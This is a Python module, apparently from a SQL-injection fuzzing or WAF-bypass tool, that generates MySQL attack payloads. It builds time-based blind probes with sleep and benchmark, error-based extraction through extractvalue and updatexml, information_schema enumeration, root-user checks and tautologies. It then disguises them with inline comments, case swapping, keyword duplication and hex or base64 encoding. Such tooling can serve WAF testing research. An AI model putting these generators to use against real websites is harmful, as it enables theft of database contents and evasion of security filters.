import base64
import random
import sys
from random_words import RandomWords
import string
import sqlparse
from SQLi import *
from global_vars import *

sign = [
    "0x21", "0x40", "0x23", "0x24", "0x25", "0x5E", "0x26", "0x2A", "0x28", "0x29", "0x2D",
    "0x5F", "0x2B", "0x3D", "0x5B", "0x5D", "0x7B", "0x7D", "0x3B", "0x3A", "0x27", "0x22",
    "0x3C", "0x3E", "0x2C", "0x2E", "0x2F", "0x3F", "0x20", "0x09", "0x0A", "0x0D", "0x08",
    "0x60"
]

reserved_keywords = [
    "SELECT", "INSERT", "UPDATE", "DELETE",
    "CREATE", "DROP", "ALTER", "TRUNCATE",
    "PRIMARY", "KEY", "UNIQUE", "FOREIGN", "INDEX",
    "WHERE", "AND", "OR", "NOT", "IN",
    "LIKE", "BETWEEN", "COMMIT", "ROLLBACK", "SAVEPOINT",
    "ORDER", "BY", "GROUP", "HAVING",
    "AS", "FROM", "TO", "JOIN", "ON",
    "NULL", "TRUE", "FALSE", "INT", "VARCHAR",
    "TEXT", "DATE", "FLOAT", "DOUBLE", "BOOLEAN"
]


def F_random_mysql_reserved_keywords():
    return random.choice(reserved_keywords)


def F_random_word():
    while True:
        random_word = RandomWords().random_word()
        tokens = sqlparse.parse(random_word)
        if tokens[0][0].ttype is None:
            return random_word

def A_SingleComment_Rewrite(token):
    return token + F_Inline_Comment_Random_Sentence()


def F_Compare():
    n = random.randint(1, 100)
    content = random.choice([F_MysqlF(), "select " + F_Concat()])
    left = "{}({},{})".format('left', content, n)
    substr = "{}({},{},{})".format('substr', content, n, 1)
    ascii = "{}({})={}".format('ascii', random.choice([left, substr]), F_Ascii_char())
    booleanfun = [
        "{}='{}'".format(left, F_Char()),
        "{}='{}'".format(substr, F_Char()),
        ascii
    ]
    return random.choice(booleanfun)


def F_elt_compare():
    elt = 'elt({},{},{})'.format(F_Compare(), 1, 0)
    return elt


def F_Sleep():
    sleep_if = '(select ' + "if({},{},{})".format(F_Compare(), 'sleep(1)', F_NotDigitPositiveZero()) + ')'
    sleep_elt = 'elt({},{},{})'.format(F_Compare(), 'sleep(1)', 0)
    sleep = [
        'sleep(1)',
        '(select sleep(1))',
        sleep_if,
        sleep_elt
    ]
    return random.choice(sleep)


def F_Benchmark():
    benchmark_if = '(select ' + "if({},{},{})".format(F_Compare(), 'benchmark(1000000,rand())',
                                                      F_NotDigitPositiveZero()) + ')'
    benchmark_elt = 'elt({},{},{})'.format(F_Compare(), 'benchmark(1000000,rand())', 0)
    benchmark = [
        'benchmark(1000000,rand())',
        '(select benchmark(1000000,rand()))',
        benchmark_if,
        benchmark_elt
    ]
    return random.choice(benchmark)


def F_Error():
    content = random.choice([F_MysqlF(), "select " + F_Concat()])
    errors = [
        "extractvalue(1,concat({},({}),{}))".format(random.choice(sign), content,
                                                    random.choice(sign)),
        "updatexml(1,concat({},({}),{}),0)".format(random.choice(sign), content,
                                                   random.choice(sign))
    ]
    return random.choice(errors)


def F_Concat():
    database_name = F_DatabaseName()
    table_name = F_TableName()
    column_name = F_ColumnName()
    inf = [
        "group_concat(table_name) from information_schema.tables where table_schema='{}'".format(
            database_name),
        "group_concat(column_name) from information_schema.columns where table_name='{}' and table_schema='{}'".format(
            table_name, database_name),
        "group_concat({}) from {}".format(column_name, table_name)
    ]
    return random.choice(inf)


def F_InsertOrUpdateContent():
    table_name = F_TableName()
    num_columns = random.randint(1, 3)
    columns = ", ".join([F_ColumnName() for _ in range(num_columns)])
    values = ", ".join([random.choice([str(random.randint(1, 100)), "'" + F_random_word() + "'"])
                        for _ in range(num_columns)])
    insert_statement = f"{table_name} ({columns}) VALUES ({values})"
    return insert_statement


def F_InsertContent():
    table_name = F_TableName()
    num_columns = random.randint(1, 3)
    column_names = [F_ColumnName() for _ in range(num_columns)]
    value_names = [random.choice([str(random.randint(1, 100)), "'" + F_random_word() + "'"]) for _ in
                   range(num_columns)]
    elements = ", ".join([f"{col}={val}" for col, val in zip(column_names, value_names)])
    insert_statement = f"{table_name} SET {elements}"
    return insert_statement


def F_UpdateContent():
    table_name = F_TableName()
    num_columns = random.randint(1, 3)
    columns = ", ".join([F_ColumnName() for _ in range(num_columns)])
    values = ", ".join([random.choice([str(random.randint(1, 100)), "'" + F_random_word() + "'"])
                        for _ in range(num_columns)])
    value = random.choice([str(random.randint(1, 100)), "'" + F_random_word() + "'"])
    update_statement = f"{table_name} ({columns}) VALUES ({values}) where {F_ColumnName()}={value}"
    return update_statement


def F_DeleteContent():
    table_name = F_TableName()
    value = random.choice([str(random.randint(1, 100)), "'" + F_random_word() + "'"])
    delete_statement = f"{table_name} where {F_ColumnName()}={value}"
    return delete_statement


def F_tautology_number():
    n = random.randint(1, 100)
    equal = random.choice(['=', 'like'])
    if equal == '=':
        left = 0
    else:
        left = 1
    space_number = random.randint(left, 3)
    spaces1 = ' ' * space_number
    spaces2 = ' ' * space_number
    return '{}{}{}{}{}'.format(random.choice([n, "(select " + str(n) + ")"]), spaces1, equal, spaces2,
                               random.choice([n, "(select " + str(n) + ")"]))


def F_tautology_string():
    n = random.randint(1, 100)
    if n < 50:
        n = F_Inline_Comment_Random_Word()
    euqal = random.choice(['=', 'like'])
    if euqal == '=':
        left = 0
    else:
        left = 1
    space_number = random.randint(left, 3)
    spaces1 = ' ' * space_number
    spaces2 = ' ' * space_number
    return "'{}'{}{}{}'{}'".format(n, spaces1, euqal, spaces2, n)


def F_tautology_complex():
    ts = [
        "select 1",
        "select if(abs(strcmp(ascii(mid(user(), 1, 1)), 114)) - 1, 1, 0)",
        "select find_in_set(ord(mid(user(), 1, 1)), '114')",
        "select ord('r') regexp '^114$'",
        "select ord('r') between 114 and 115",
        "select exists(select 1 from information_schema.tables where table_schema = 'mysql')",
        "select case when length(user()) > 3 then 1 else 0 end",
        "select 1 from dual where exists (select 1 from mysql.user where user = 'root')",
        "select 1 from dual where not exists (select 1 from mysql.user where user = 'guest')",
    ]
    euqal = random.choice(['=', 'like'])
    if euqal == '=':
        left = 0
    else:
        left = 1
    space_number = random.randint(left, 3)
    spaces1 = ' ' * space_number
    spaces2 = ' ' * space_number
    return '({}){}{}{}({})'.format(random.choice(ts), spaces1, euqal, spaces2, random.choice(ts))


def F_Inline_Comment_Random_Word():
    if input_args.pattern == 'WAFaas' and (
            input_args.request_method == 'GET' or input_args.request_method == 'GET(JSON)'):
        base = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[]{}:,.<>.?123456789@$^*()_+-='
    else:
        base = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ#[]{}:,.<>.?123456789!@$%^*()_+-='
    if input_args.request_method == 'ML':
        bounds = [5, 15]
    else:
        bounds = [1, 5]
    res = ''.join(random.sample(base, random.randint(bounds[0], bounds[1])))
    return res


def F_Inline_Comment_Benign():
    choices = benign_payloads
    return random.choice(choices)


def F_Inline_Comment_Random_Sentence():
    sentense = ''
    for _ in range(random.randint(1, 3)):
        sentense += F_random_word() + ' '
    return sentense


def A_Swap_Case(token):
    new_token = []
    for c in token:
        if random.random() > 0.5:
            c = c.swapcase()
        new_token.append(c)
    return "".join(new_token)


def A_Swap_Duplicate(token):
    words = token.split()
    doubled_words = []
    for word in words:
        if len(word) < 2:
            doubled_word = word * 2
        else:
            random_index = random.randint(1, len(word) - 1)
            doubled_word = word[:random_index] + word + word[random_index:]
        doubled_words.append(doubled_word)
    doubled_token = ' '.join(doubled_words)
    return doubled_token


def A_Inline_Comment(token):
    return "/*!" + token + "*/"


def A_Swap_Integer_Hex(number):
    return hex(int(number))


def A_Swap_Integer_Base64(number):
    number_str = str(number)
    base64_encoded = base64.b64encode(number_str.encode()).decode()
    return base64_encoded


def F_Whitespace_Alternatives():
    replacements = [
        "\t", "\n", "\r", "/**/", "\f", "\v"
    ]
    return random.choice(replacements)


def F_True_Query():
    random_number = str(F_NotDigitPositiveZero())
    random_number1 = F_NotDigitPositiveZero()
    random_number2 = F_NotDigitPositiveZero()
    while random_number1 == random_number2:
        random_number2 = F_NotDigitPositiveZero()
    replacements = [
        random_number,
        '(select ' + random_number + ')',
        str(random_number1) + '<>' + str(random_number2),
        random_number + '=' + random_number,
        'True'
    ]
    return random.choice(replacements)


def F_False_Query():
    random_number = str(F_NotDigitPositiveZero())
    random_number1 = F_NotDigitPositiveZero()
    random_number2 = F_NotDigitPositiveZero()
    replacements = [
        '0',
        '(select 0)',
        str(random_number1) + '=' + str(random_number2),
        random_number + '<>' + random_number,
        'False',
    ]
    return random.choice(replacements)


def F_Or():
    return random.choice(['or', '||'])


def F_And():
    return random.choice(['and', '&&'])


def F_Not():
    return random.choice(['not', '!'])


def F_Space():
    return ' '


def F_Hashtag():
    return '#'


def F_NotDigitPositiveZero():
    if random.random() < 0.8:
        return str(random.randint(1, 10000))
    else:
        return str(random.randint(1, 2147483647))


def F_Digit():
    if random.random() < 0.8:
        return str(random.randint(-10000, 10000))
    else:
        return str(random.randint(-2147483648, 2147483647))


def F_MysqlF():
    choices = mysql_functions
    return random.choice(choices)


def F_sleep():
    return 'sleep(1)'


def F_Char():
    all_letters = string.ascii_letters
    return random.choice(all_letters)


def F_Ascii_char():
    if random.choice([True, False]):
        number = random.randint(65, 90)
    else:
        number = random.randint(97, 122)
    return str(number)


def F_DatabaseName():
    choices = database_names
    choices.append(F_random_word())
    return random.choice(choices)


def F_TableName():
    choices = table_names
    choices.append(F_random_word())
    return random.choice(choices)


def F_ColumnName():
    choices = column_names
    choices.append(F_random_word())
    return random.choice(choices)


def A_QuotationMark_Swap_Hex(s):
    if s.startswith('"') and s.endswith('"'):
        s = s[1:-1]
    elif s.startswith("'") and s.endswith("'"):
        s = s[1:-1]
    hex_output = "0x" + s.encode('utf-8').hex()
    return hex_output